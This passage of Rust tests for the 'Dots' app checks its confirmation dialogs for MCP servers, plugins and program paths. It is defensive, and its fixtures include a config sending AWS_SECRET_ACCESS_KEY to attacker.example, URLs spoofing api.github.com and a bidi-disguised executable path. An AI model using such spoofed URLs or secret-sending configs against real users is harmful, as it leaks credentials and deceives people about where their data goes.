        // A quote and a backslash are escaped; a control or direction character is spelled out.
        let odd = q(&stdio("node", &["x\" \\ \n\u{202e}"], None));
        assert!(
            odd.starts_with(r#"Dots will run: "node" "x\" \\ \u{000A}\u{202E}". Run it?"#),
            "{odd}"
        );
    }

    #[tokio::test]
    async fn what_the_core_refuses_is_refused_before_any_question() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let asked = std::cell::Cell::new(0);
        let ask = |_| {
            asked.set(asked.get() + 1);
            std::future::ready(true)
        };
        let LibraryConfig::McpServer(bad_arg) = stdio("node", &["a\nb"], None) else {
            unreachable!()
        };
        let err = probe_confirmed(&rt, bad_arg, ask).await.unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        let in_key = LibraryConfig::McpServer(McpServerConfig::Stdio {
            command: "node".into(),
            args: vec![],
            cwd: None,
            env: [("A\nB".to_string(), "v".to_string())].into(),
        });
        let err = add_confirmed(&rt, "srv", in_key, None, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        let bidi = stdio("node", &["a\u{202e}b"], None);
        let err = add_confirmed(&rt, "srv", bidi, None, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        // A bad name.
        let err = add_confirmed(&rt, "Bad Name", stdio("node", &[], None), None, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        // A kind change on update.
        let item = add_confirmed(&rt, "srv", http(), None, ask).await.unwrap();
        let skill = LibraryConfig::Skill(dots_core::library::SkillConfig {
            path: "C:/s".into(),
        });
        let err = update_confirmed(&rt, &item.id, skill, ask)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(asked.get(), 0);
        rt.shutdown();
    }

    fn http_with(url: &str, header: &str) -> LibraryConfig {
        LibraryConfig::McpServer(McpServerConfig::Http {
            url: url.into(),
            headers: [("X-Key".to_string(), header.to_string())].into(),
        })
    }

    #[test]
    fn an_http_server_that_sends_variables_asks_for_a_new_origin_or_variable() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let base = http_with("https://Host.example:8443/mcp", "Bearer ${GITHUB_TOKEN}");
        let asked = q(None, &base).unwrap();
        assert!(
            asked.starts_with(
                r#"Dots will send the values of GITHUB_TOKEN to "https://host.example:8443". Send them?"#
            ),
            "{asked}"
        );
        assert_eq!(library_title(&asked), "Send these variables?");
        // Only a literal, the origin and the variables the same: no question.
        let same = http_with("https://host.example:8443/other", "Bearer ${GITHUB_TOKEN}");
        assert_eq!(q(Some(&base), &same), None);
        // Another origin, another or one more variable, or a stored stdio server: asks.
        for next in [
            http_with("https://evil.example/mcp", "Bearer ${GITHUB_TOKEN}"),
            http_with("http://host.example:8443/mcp", "Bearer ${GITHUB_TOKEN}"),
            http_with("https://host.example:8443/mcp", "${OTHER}"),
            http_with("https://host.example:8443/${AWS_SECRET}", "${GITHUB_TOKEN}"),
        ] {
            assert!(q(Some(&base), &next).is_some(), "{next:?}");
        }
        assert!(q(Some(&stdio("x", &[], None)), &base).is_some());
        // Nothing to send, nothing to ask.
        assert_eq!(q(None, &http_with("https://h/mcp", "plain")), None);
        let two = q(None, &http_with("https://h/${B}", "${A}")).unwrap();
        assert!(two.contains("values of A, B to"), "{two}");
    }

    #[tokio::test]
    async fn a_refused_variable_send_is_cancelled_before_the_core() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let LibraryConfig::McpServer(leak) =
            http_with("https://attacker.example/${AWS_SECRET_ACCESS_KEY}", "x")
        else {
            unreachable!()
        };
        let mut asked = Vec::new();
        let err = probe_confirmed(&rt, leak, |q| {
            asked.push(q);
            std::future::ready(false)
        })
        .await
        .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(
            asked[0].contains("AWS_SECRET_ACCESS_KEY") && asked[0].contains("attacker.example")
        );
        let no = |_| std::future::ready(false);
        let yes = |_| std::future::ready(true);
        let config = http_with("https://a.example/mcp", "${TOK}");
        let err = add_confirmed(&rt, "web", config.clone(), None, no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(rt.library().list().await.unwrap().is_empty());
        let item = add_confirmed(&rt, "web", config, None, yes).await.unwrap();
        // A header literal only: no question (a refusal would stop it). Another origin asks.
        let same = http_with("https://a.example/mcp", "${TOK}");
        update_confirmed(&rt, &item.id, same, no).await.unwrap();
        let moved = http_with("https://b.example/mcp", "${TOK}");
        let err = update_confirmed(&rt, &item.id, moved, no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        rt.shutdown();
    }

    #[test]
    fn a_new_plugin_whose_http_server_sends_variables_asks_and_names_them() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".mcp.json"),
            r#"{"mcpServers":{"w":{"type":"http","url":"https://H.example:9/x","headers":{"A":"Bearer ${TOKEN}"}},"plain":{"type":"http","url":"https://plain.example/mcp"}}}"#,
        )
        .unwrap();
        let config = LibraryConfig::Plugin(dots_core::library::PluginConfig {
            path: dir.path().to_string_lossy().into_owned(),
            installed_id: None,
            run_hooks: false,
        });
        let starts = starts_of(None, &config);
        assert_eq!(starts, [r#"the values of TOKEN to "https://h.example:9""#]);
        let asked = library_confirmation(None, &config, &starts).unwrap();
        assert_eq!(
            asked,
            r#"This plugin sends the values of TOKEN to "https://h.example:9". Add it?"#
        );
        // With stdio servers and hooks the one dialog holds all three.
        let both = vec![r#""node" "a.js""#.to_string(), starts[0].clone()];
        let hooks = LibraryConfig::Plugin(dots_core::library::PluginConfig {
            run_hooks: true,
            ..match &config {
                LibraryConfig::Plugin(p) => p.clone(),
                _ => unreachable!(),
            }
        });
        let asked = library_confirmation(None, &hooks, &both).unwrap();
        assert!(asked.starts_with(r#"This plugin starts: "node" "a.js". It sends the values of"#));
        assert!(asked.contains("Its hooks also run commands"), "{asked}");
        // Only a variable-free http server: nothing to ask.
        std::fs::write(
            dir.path().join(".mcp.json"),
            r#"{"mcpServers":{"plain":{"type":"http","url":"https://plain.example/mcp"}}}"#,
        )
        .unwrap();
        let none = starts_of(None, &config);
        assert!(none.is_empty());
        assert_eq!(library_confirmation(None, &config, &none), None);
    }

    #[test]
    fn the_dialog_names_the_origin_the_client_will_use() {
        let q = |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation(s, n, &[]);
        let trusted = http_with("https://api.github.com/mcp", "${GITHUB_TOKEN}");
        let sneaky = http_with(
            r"https://evil.example\@api.github.com/mcp",
            "${GITHUB_TOKEN}",
        );
        let asked = q(Some(&trusted), &sneaky).unwrap();
        assert!(asked.contains(r#"to "https://evil.example""#), "{asked}");
        // The default port is no change.
        let with_port = http_with("https://API.github.com:443/other", "${GITHUB_TOKEN}");
        assert_eq!(q(Some(&trusted), &with_port), None);
        // A variable in the host: the raw url, quoted.
        let var = http_with("https://${HOST}/mcp", "x");
        let asked = q(None, &var).unwrap();
        assert!(
            asked.contains(r#"values of HOST to "https://${HOST}/mcp""#),
            "{asked}"
        );
    }

    #[test]
    fn the_dialog_names_the_host_a_variable_moves_the_url_to() {
        let env = |k: &str| match k {
            "HOMEPATH" => Some(r"\Users\aksha".to_string()),
            "GITHUB_TOKEN" => Some("t".to_string()),
            "IDN" => Some("bücher.de".to_string()),
            _ => None,
        };
        let q =
            |s: Option<&LibraryConfig>, n: &LibraryConfig| library_confirmation_in(s, n, &[], &env);
        // validate refuses these texts; the dialog is the second line of defence.
        let sneaky = http_with(
            "https:///evil.example${HOMEPATH}@api.github.com/mcp",
            "${GITHUB_TOKEN}",
        );
        let asked = q(None, &sneaky).unwrap();
        assert!(
            asked.contains(r#"values of GITHUB_TOKEN, HOMEPATH to "https://evil.example""#),
            "{asked}"
        );
        // An update from the trusted host to it asks, though the raw text reads like the same one.
        let trusted = http_with("https://api.github.com/mcp", "${GITHUB_TOKEN}");
        assert!(q(Some(&trusted), &sneaky).is_some());
        // An unset variable: the raw url, quoted, and why.
        let unset = http_with("https://${NOPE}/mcp", "x");
        let asked = q(None, &unset).unwrap();
        assert!(
            asked.contains(
                r#"to "https://${NOPE}/mcp" (NOPE is not set: the server cannot start until it is set)"#
            ),
            "{asked}"
        );
        // A host in Unicode shows both forms.
        let idn = http_with("https://${IDN}/mcp", "x");
        let asked = q(None, &idn).unwrap();
        assert!(
            asked.contains(r#"to "https://xn--bcher-kva.de" (bücher.de)"#),
            "{asked}"
        );
    }

    #[test]
    fn the_core_refuses_the_urls_the_dialog_could_misname() {
        for url in [
            "https:///evil.example${HOMEPATH}@api.github.com/mcp",
            r"https://\evil.example${HOMEPATH}@api.github.com/mcp",
            r"https://evil.example\@api.github.com/mcp",
        ] {
            assert!(http_with(url, "x").validate().is_err(), "{url}");
        }
    }

    #[test]
    fn the_message_names_the_program() {
        assert!(claude_program_message("C:/x/claude.exe").contains("\n\nC:/x/claude.exe\n\n"));
    }

    #[test]
    fn only_debug_builds_take_the_answer_from_the_environment() {
        assert!(preconfirmed(true, Some("yes")));
        assert!(!preconfirmed(false, Some("yes")));
        assert!(!preconfirmed(true, Some("1")));
        assert!(!preconfirmed(true, None));
    }

    /// The origins confirmed in Personal for the item `id`.
    async fn confirmed(rt: &Runtime, id: &str) -> Vec<String> {
        rt.store()
            .confirmed_origins(id)
            .await
            .unwrap()
            .remove("personal")
            .unwrap_or_default()
    }

    /// Every question asked, and the answer `answer` to each.
    fn answering(
        asked: &std::cell::RefCell<Vec<String>>,
        answer: bool,
    ) -> impl FnOnce(String) -> std::future::Ready<bool> + '_ {
        move |q| {
            asked.borrow_mut().push(q);
            std::future::ready(answer)
        }
    }

    #[tokio::test]
    async fn an_allowed_variable_send_confirms_the_personal_origin_it_named() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        rt.vault()
            .add("MCP_HOST", EntryKind::Plain, "Mcp.Example:8443")
            .await
            .unwrap();
        let asked = std::cell::RefCell::new(Vec::new());
        let config = http_with("https://${MCP_HOST}/mcp", "Bearer ${TOK}");

        // A no saves nothing, so nothing is confirmed.
        let err = add_confirmed(&rt, "web", config.clone(), None, answering(&asked, false))
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(rt.library().list().await.unwrap().is_empty());
        // A yes records the origin the question named, as the client reaches it.
        let item = add_confirmed(&rt, "web", config, None, answering(&asked, true))
            .await
            .unwrap();
        assert!(
            asked.borrow()[1].contains(r#"values of MCP_HOST, TOK to "https://mcp.example:8443""#),
            "{:?}",
            asked.borrow()
        );
        assert_eq!(confirmed(&rt, &item.id).await, ["https://mcp.example:8443"]);

        // Nothing relevant changed: no question, and the confirmation stays.
        let path = http_with("https://${MCP_HOST}/other", "Bearer ${TOK}");
        update_confirmed(&rt, &item.id, path, answering(&asked, false))
            .await
            .unwrap();
        assert_eq!(asked.borrow().len(), 2);
        assert_eq!(confirmed(&rt, &item.id).await, ["https://mcp.example:8443"]);
        // Moved, the URL still reading a variable, and declined: nothing recorded.
        let moved = http_with("https://b.example/mcp?via=${MCP_HOST}", "Bearer ${TOK}");
        let err = update_confirmed(&rt, &item.id, moved.clone(), answering(&asked, false))
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert_eq!(confirmed(&rt, &item.id).await, ["https://mcp.example:8443"]);
        // Moved and allowed: the new origin is recorded next to the old one.
        update_confirmed(&rt, &item.id, moved, answering(&asked, true))
            .await
            .unwrap();
        assert_eq!(
            confirmed(&rt, &item.id).await,
            ["https://mcp.example:8443", "https://b.example"]
        );
        assert_eq!(asked.borrow().len(), 4);

        // A question whose origin could not be computed confirms none.
        let unset = http_with("https://${NOPE}/mcp", "${TOK}");
        let item = add_confirmed(&rt, "unset", unset, None, answering(&asked, true))
            .await
            .unwrap();
        assert!(asked.borrow()[4].contains("NOPE is not set"));
        assert!(rt
            .store()
            .confirmed_origins(&item.id)
            .await
            .unwrap()
            .is_empty());
        // A secret typed into a header asks nothing. Dots moves it into Personal, so the server
        // sends a variable, to the one origin its fixed URL has: it is not pinned, and nothing
        // is confirmed.
        let typed = http_with("https://typed.example/mcp", "typed-secret-value-81f3");
        let item = add_confirmed(&rt, "typed", typed, None, answering(&asked, false))
            .await
            .unwrap();
        assert_eq!(asked.borrow().len(), 5);
        assert!(rt
            .store()
            .confirmed_origins(&item.id)
            .await
            .unwrap()
            .is_empty());
        // A fixed URL whose header reads a variable asks, and a yes confirms nothing: there is
        // no pin to record.
        let fixed = http_with("https://fixed.example/mcp", "Bearer ${TOK}");
        let item = add_confirmed(&rt, "fixed", fixed, None, answering(&asked, true))
            .await
            .unwrap();
        assert!(asked.borrow()[5].contains(r#"values of TOK to "https://fixed.example""#));
        assert!(rt
            .store()
            .confirmed_origins(&item.id)
            .await
            .unwrap()
            .is_empty());
        // A server that sends no variables asks nothing and has nothing to confirm.
        let item = add_confirmed(&rt, "plain", http(), None, answering(&asked, false))
            .await
            .unwrap();
        assert_eq!(asked.borrow().len(), 6);
        assert!(rt
            .store()
            .confirmed_origins(&item.id)
            .await
            .unwrap()
            .is_empty());
        for question in asked.borrow().iter() {
            assert!(!question.contains("Mcp.Example") && !question.contains("typed-secret"));
        }
        rt.shutdown();
    }

    #[tokio::test]
    async fn an_allowed_plugin_confirms_the_origins_of_its_servers_whose_url_reads_a_variable() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        rt.vault()
            .add("W_HOST", EntryKind::Plain, "H.example:9")
            .await
            .unwrap();
        let folder = tempfile::tempdir().unwrap();
        let servers = serde_json::json!({"mcpServers": {
            "w": {"type": "http", "url": "https://${W_HOST}/x",
                  "headers": {"A": "Bearer ${TOKEN}"}},
            "fixed": {"type": "http", "url": "https://fixed.example/mcp",
                      "headers": {"A": "Bearer ${TOKEN}"}},
            "plain": {"type": "http", "url": "https://plain.example/mcp"},
        }});
        std::fs::write(folder.path().join(".mcp.json"), servers.to_string()).unwrap();
        let config = LibraryConfig::Plugin(dots_core::library::PluginConfig {
            path: folder.path().to_string_lossy().into_owned(),
            installed_id: None,
            run_hooks: false,
        });
        let asked = std::cell::RefCell::new(Vec::new());
        let err = add_confirmed(&rt, "forms", config.clone(), None, answering(&asked, false))
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(rt.library().list().await.unwrap().is_empty());

        let plugin = add_confirmed(&rt, "forms", config, None, answering(&asked, true))
            .await
            .unwrap();
        assert_eq!(asked.borrow().len(), 2);
        let servers = rt.store().owned_library_items(&plugin.id).await.unwrap();
        let by_name = |name: &str| servers.iter().find(|s| s.name == name).unwrap().id.clone();
        assert_eq!(
            confirmed(&rt, &by_name("plugin-forms-w")).await,
            ["https://h.example:9"]
        );
        for name in ["plugin-forms-fixed", "plugin-forms-plain"] {
            assert!(confirmed(&rt, &by_name(name)).await.is_empty(), "{name}");
        }
        rt.shutdown();
    }

    const PROGRAM: &str = "C:/tools/claude.exe";

    #[tokio::test]
    async fn a_declined_server_is_neither_probed_nor_stored_and_an_allowed_one_is() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        // A program that does not exist, and no accept: nothing is ever started.
        let config = stdio("dots-no-such-mcp-server", &["a"], None);
        let LibraryConfig::McpServer(server) = config.clone() else {
            unreachable!()
        };
        let mut asked = Vec::new();
        let err = probe_confirmed(&rt, server, |q| {
            asked.push(q);
            std::future::ready(false)
        })
        .await
        .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert_eq!(asked.len(), 1);
        assert!(asked[0].starts_with(r#"Dots will run: "dots-no-such-mcp-server" "a". Run it?"#));

        let no = |_| std::future::ready(false);
        let yes = |_| std::future::ready(true);
        let err = add_confirmed(&rt, "srv", config.clone(), None, no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(rt.library().list().await.unwrap().is_empty());

        let item = add_confirmed(&rt, "srv", config.clone(), None, yes)
            .await
            .unwrap();

        // The same command line again: no question (a refusal would stop it). Another one
        // asks, and a refusal leaves the stored config as it was.
        update_confirmed(&rt, &item.id, config.clone(), no)
            .await
            .unwrap();
        let other = stdio("dots-no-such-mcp-server", &["b"], None);
        let err = update_confirmed(&rt, &item.id, other.clone(), no)
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        let stored = rt.library().list().await.unwrap().remove(0).item.config;
        assert_eq!(stored, config);
        update_confirmed(&rt, &item.id, other.clone(), yes)
            .await
            .unwrap();
        let stored = rt.library().list().await.unwrap().remove(0).item.config;
        assert_eq!(stored, other);

        // A server over HTTP is not a program to run.
        add_confirmed(&rt, "web", http(), None, no).await.unwrap();
        rt.shutdown();
    }

    /// A runtime on a temporary data folder: its server on a free port, and no Claude CLI, so
    /// nothing is spawned.
    async fn runtime(dir: &tempfile::TempDir) -> Runtime {
        let mut cfg = dots_core::Config::new(dir.path().join("data"));
        cfg.port = 0;
        cfg.claude_path = Some(dir.path().join("no-claude.exe"));
        Runtime::start(cfg).await.unwrap()
    }

    /// Saves `settings` with every question answered `answer`. Returns the result and the
    /// questions that were asked.
    async fn save(
        rt: &Runtime,
        settings: Settings,
        answer: bool,
    ) -> (Result<SettingsSaved, CmdError>, Vec<String>) {
        let mut asked = Vec::new();
        let result = save_settings_confirmed(rt, settings, |_title, message| {
            asked.push(message);
            std::future::ready(answer)
        })
        .await;
        (result, asked)
    }

    fn with_program(settings: &Settings, path: &str) -> Settings {
        Settings {
            claude_path: Some(path.into()),
            ..settings.clone()
        }
    }

    #[tokio::test]
    async fn a_declined_claude_program_is_not_saved() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        let (result, asked) = save(&rt, with_program(&before, PROGRAM), false).await;
        assert_eq!(
            result,
            Err(CmdError::cancelled("the Claude program was not changed"))
        );
        assert_eq!(asked, [claude_program_message(PROGRAM)]);
        assert!(asked[0].contains(PROGRAM));
        assert_eq!(rt.settings().await, before);
        rt.shutdown();
    }

    #[tokio::test]
    async fn an_allowed_claude_program_is_saved_as_it_was_shown() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        // The path is trimmed once: the question shows the string that is then stored.
        let typed = format!("  {PROGRAM} ");
        let (result, asked) = save(&rt, with_program(&before, &typed), true).await;
        let saved = result.unwrap();
        assert_eq!(asked, [claude_program_message(PROGRAM)]);
        assert_eq!(saved.settings.claude_path.as_deref(), Some(PROGRAM));
        assert!(saved.restart_required);
        assert_eq!(rt.settings().await, saved.settings);
        rt.shutdown();
    }

    #[tokio::test]
    async fn the_stored_program_and_a_cleared_one_are_saved_without_a_question() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let (result, _) = save(&rt, with_program(&rt.settings().await, PROGRAM), true).await;
        let stored = result.unwrap().settings;

        // The same program, with another setting changed. `false` would refuse it if asked.
        let more_runs = Settings {
            max_concurrent_runs: 3,
            ..stored.clone()
        };
        let (result, asked) = save(&rt, more_runs.clone(), false).await;
        assert_eq!(result.unwrap().settings, more_runs);
        assert_eq!(asked, [] as [String; 0]);

        // The same program with spaces around it is the same after trimming.
        let (result, asked) = save(
            &rt,
            with_program(&more_runs, &format!(" {PROGRAM} ")),
            false,
        )
        .await;
        assert_eq!(result.unwrap().settings, more_runs);
        assert_eq!(asked, [] as [String; 0]);

        // Cleared: back to searching PATH.
        let cleared = Settings {
            claude_path: None,
            ..more_runs
        };
        let (result, asked) = save(&rt, cleared.clone(), false).await;
        assert_eq!(result.unwrap().settings, cleared);
        assert_eq!(asked, [] as [String; 0]);
        assert_eq!(rt.settings().await.claude_path, None);
        rt.shutdown();
    }

    #[tokio::test]
    async fn invalid_settings_are_refused_before_anything_is_asked() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        let bad = Settings {
            port: 0,
            ..with_program(&before, PROGRAM)
        };
        // `true`: the settings would be saved if the question came first.
        let (result, asked) = save(&rt, bad, true).await;
        let err = result.unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(err.message, "port must be between 1 and 65535");
        assert_eq!(asked, [] as [String; 0]);
        assert_eq!(rt.settings().await, before);
        rt.shutdown();
    }

    #[tokio::test]
    async fn a_program_path_that_would_not_show_as_it_is_never_reaches_the_question() {
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;

        // In a dialog this reads "C:/tools/claude.exe": the override turns the rest around.
        let disguised = "C:/tools/\u{202e}exe.edualc";
        // `true`: the path would be saved if the question came first.
        let (result, asked) = save(&rt, with_program(&before, disguised), true).await;
        let err = result.unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(
            err.message,
            "claude_path must not contain invisible or text-direction characters (found U+202E \
             at character 10)"
        );
        assert_eq!(asked, [] as [String; 0]);
        assert_eq!(rt.settings().await, before);

        // A line break inside the path is refused; one pasted after it is trimmed away.
        let (result, asked) = save(&rt, with_program(&before, "C:/tools\n/claude.exe"), true).await;
        assert_eq!(result.unwrap_err().kind, CmdErrorKind::Invalid);
        assert_eq!(asked, [] as [String; 0]);
        let (result, asked) =
            save(&rt, with_program(&before, &format!("{PROGRAM}\r\n")), true).await;
        assert_eq!(
            result.unwrap().settings.claude_path.as_deref(),
            Some(PROGRAM)
        );
        assert_eq!(asked, [claude_program_message(PROGRAM)]);
        rt.shutdown();
    }

    #[tokio::test]
    async fn a_new_edge_program_is_confirmed_and_a_declined_one_is_not_saved() {
        const EDGE: &str = "D:/Apps/Edge/msedge.exe";
        let dir = tempfile::tempdir().unwrap();
        let rt = runtime(&dir).await;
        let before = rt.settings().await;
        let edge = |path: Option<&str>| Settings {
            edge_path: path.map(str::to_string),
            ..before.clone()
        };

        let (result, asked) = save(&rt, edge(Some(EDGE)), false).await;
        assert_eq!(
            result,
            Err(CmdError::cancelled("the Edge program was not changed"))
        );
        assert_eq!(asked, [edge_program_message(EDGE)]);
        assert_eq!(rt.settings().await, before);

        // Allowed: trimmed once, saved as shown, and used from the next start of an Edge.
        let typed = format!(" {EDGE} ");
        let (result, asked) = save(&rt, edge(Some(typed.as_str())), true).await;
        let saved = result.unwrap();
        assert_eq!(asked, [edge_program_message(EDGE)]);
        assert_eq!(saved.settings.edge_path.as_deref(), Some(EDGE));
        assert!(!saved.restart_required);

        // The same program, or none: no question.
        let (result, asked) = save(&rt, saved.settings.clone(), false).await;
        assert!(result.is_ok());
        assert_eq!(asked, [] as [String; 0]);
        let (result, asked) = save(&rt, edge(None), false).await;
        assert_eq!(result.unwrap().settings.edge_path, None);
        assert_eq!(asked, [] as [String; 0]);
        rt.shutdown();
    }

    /// A server whose host comes from `${MCP_HOST}`, which Personal sets to a port nothing
    /// listens on, so a check that runs records `unreachable`. Added as the store adds it,
    /// with nothing confirmed.
    async fn pinned(rt: &Runtime, name: &str) -> LibraryItem {
        let config = http_with("http://${MCP_HOST}/mcp", "Bearer ${TOK}");
        rt.store()
            .add_library_item(name, &config, None)
            .await
            .unwrap()
    }

    async fn with_host(dir: &tempfile::TempDir) -> Runtime {
        let rt = runtime(dir).await;
        rt.vault()
            .add("MCP_HOST", EntryKind::Plain, "127.0.0.1:1")
            .await
            .unwrap();
        rt.vault()
            .add("TOK", EntryKind::Secret, "check-secret-value-6d21e0")
            .await
            .unwrap();
        rt
    }

    const ASKED: &str = "Dots will send the values of MCP_HOST, TOK to \"http://127.0.0.1:1\". \
                         Send them?\n\nAllow this only for a server you trust.";

    #[tokio::test]
    async fn a_check_whose_origin_is_not_confirmed_asks_then_checks() {
        let dir = tempfile::tempdir().unwrap();
        let rt = with_host(&dir).await;
        let item = pinned(&rt, "gh").await;
        let asked = std::cell::RefCell::new(Vec::new());

        // A no sends nothing and records nothing.
        let err = check_confirmed(&rt, &item.id, &DotScope::Personal, answering(&asked, false))
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert_eq!(*asked.borrow(), [ASKED]);
        assert_eq!(library_title(&asked.borrow()[0]), "Send these variables?");
        assert!(confirmed(&rt, &item.id).await.is_empty());
        let catalog = rt.store().get_catalog(&item.id, "personal").await.unwrap();
        assert_eq!(catalog.checked_at, None, "not checked: {catalog:?}");

        // A yes records the origin, then checks.
        let catalog = check_confirmed(&rt, &item.id, &DotScope::Personal, answering(&asked, true))
            .await
            .unwrap();
        assert_eq!(asked.borrow().len(), 2);
        assert!(catalog.checked_at.is_some(), "{catalog:?}");
        assert_eq!(confirmed(&rt, &item.id).await, ["http://127.0.0.1:1"]);
        // Confirmed: no question again (a no would refuse it).
        check_confirmed(&rt, &item.id, &DotScope::Personal, answering(&asked, false))
            .await
            .unwrap();
        assert_eq!(asked.borrow().len(), 2);
        // An org that is not joined is the core's refusal, unasked.
        let acme = DotScope::Org("acme-eng".into());
        let err = check_confirmed(&rt, &item.id, &acme, answering(&asked, true))
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::NotFound);
        assert_eq!(asked.borrow().len(), 2);
        for question in asked.borrow().iter() {
            assert!(!question.contains("check-secret-value"), "{question}");
        }
        rt.shutdown();
    }

    #[tokio::test]
    async fn a_server_that_is_not_pinned_is_checked_without_a_question() {
        let dir = tempfile::tempdir().unwrap();
        let rt = with_host(&dir).await;
        let fixed = http_with("http://127.0.0.1:1/mcp", "Bearer ${TOK}");
        let item = rt
            .store()
            .add_library_item("fixed", &fixed, None)
            .await
            .unwrap();
        let asked = std::cell::RefCell::new(Vec::new());
        let catalog = check_confirmed(&rt, &item.id, &DotScope::Personal, answering(&asked, false))
            .await
            .unwrap();
        assert!(catalog.checked_at.is_some());
        assert!(asked.borrow().is_empty());
        rt.shutdown();
    }

    #[tokio::test]
    async fn confirming_an_origin_asks_and_records_it_without_a_check() {
        let dir = tempfile::tempdir().unwrap();
        let rt = with_host(&dir).await;
        // A plugin's own server, which the server form cannot change.
        let folder = tempfile::tempdir().unwrap();
        let servers = serde_json::json!({"mcpServers": {
            "w": {"type": "http", "url": "http://${MCP_HOST}/mcp",
                  "headers": {"A": "Bearer ${TOK}"}},
            "fixed": {"type": "http", "url": "http://127.0.0.1:1/mcp",
                      "headers": {"A": "Bearer ${TOK}"}},
        }});
        std::fs::write(folder.path().join(".mcp.json"), servers.to_string()).unwrap();
        let config = LibraryConfig::Plugin(dots_core::library::PluginConfig {
            path: folder.path().to_string_lossy().into_owned(),
            installed_id: None,
            run_hooks: false,
        });
        let plugin = rt.library().add("forms", config, None).await.unwrap();
        let owned = rt.store().owned_library_items(&plugin.id).await.unwrap();
        let id = |name: &str| owned.iter().find(|s| s.name == name).unwrap().id.clone();
        let (w, fixed) = (id("plugin-forms-w"), id("plugin-forms-fixed"));
        let asked = std::cell::RefCell::new(Vec::new());

        let err = origin_confirmed(&rt, &w, &DotScope::Personal, answering(&asked, false))
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Cancelled);
        assert!(confirmed(&rt, &w).await.is_empty());
        origin_confirmed(&rt, &w, &DotScope::Personal, answering(&asked, true))
            .await
            .unwrap();
        assert_eq!(confirmed(&rt, &w).await, ["http://127.0.0.1:1"]);
        assert_eq!(*asked.borrow(), [ASKED, ASKED]);
        // Confirmed already: nothing is asked.
        origin_confirmed(&rt, &w, &DotScope::Personal, answering(&asked, false))
            .await
            .unwrap();
        assert_eq!(asked.borrow().len(), 2);
        // Nothing was checked.
        let catalog = rt.store().get_catalog(&w, "personal").await.unwrap();
        assert_eq!(catalog.checked_at, None);
        // A fixed URL has no origin to confirm.
        let err = origin_confirmed(&rt, &fixed, &DotScope::Personal, answering(&asked, true))
            .await
            .unwrap_err();
        assert_eq!(err.kind, CmdErrorKind::Invalid);
        assert_eq!(asked.borrow().len(), 2);
        rt.shutdown();
    }

    #[test]
    fn the_question_for_an_orgs_scope_names_the_org() {
        let asked = OriginToConfirm {
            server: "gh".into(),
            origin: HttpOrigin {
                ascii: "https://xn--bcher-kva.de".into(),
                unicode: Some("bücher.de".into()),
            },
            variables: vec!["API_KEY".into(), "MCP_HOST".into()],
            scope_name: "Acme Engineering".into(),
        };
        assert_eq!(
            origin_question(&asked, &DotScope::Org("acme-eng".into())),
            "Dots will send the values of API_KEY, MCP_HOST in Acme Engineering to \
             \"https://xn--bcher-kva.de\" (bücher.de). Send them?\n\nAllow this only for a \
             server you trust."
        );
        assert!(origin_question(&asked, &DotScope::Personal)
            .starts_with("Dots will send the values of API_KEY, MCP_HOST to \"https://"));
        assert_eq!(scope_of(None), DotScope::Personal);
        assert_eq!(
            scope_of(Some("acme-eng".into())),
            DotScope::Org("acme-eng".into())
        );
    }

    /// Two policy keys, `0101010101010101` and `0202020202020202` by fingerprint.
    const KEY_A: &str = "RWQBAQEBAQEBARERERERERERERERERERERERERERERERERERERERERER";
    const KEY_B: &str = "RWQCAgICAgICAhISEhISEhISEhISEhISEhISEhISEhISEhISEhISEhIS";

    /// The join code of `org_id` signed with `key`, its OpenBao on a port nothing listens on.
    fn org_code(org_id: &str, path: &str, key: &str) -> String {
        use dots_core::vault::org::{BaoAuth, JoinCode, OpenBaoSettings, SourceSettings};
        JoinCode {
            v: 1,
            org_id: org_id.into(),
            name: "Acme Engineering".into(),
            source: SourceSettings::OpenBao(OpenBaoSettings {
                address: "http://127.0.0.1:1".into(),
                mount: "secret".into(),
                path: path.into(),
                auth: BaoAuth::Token,
                auth_mount: None,
                namespace: None,
            }),
            policy_key: key.into(),
        }
        .encode()
    }

    #[tokio::test]
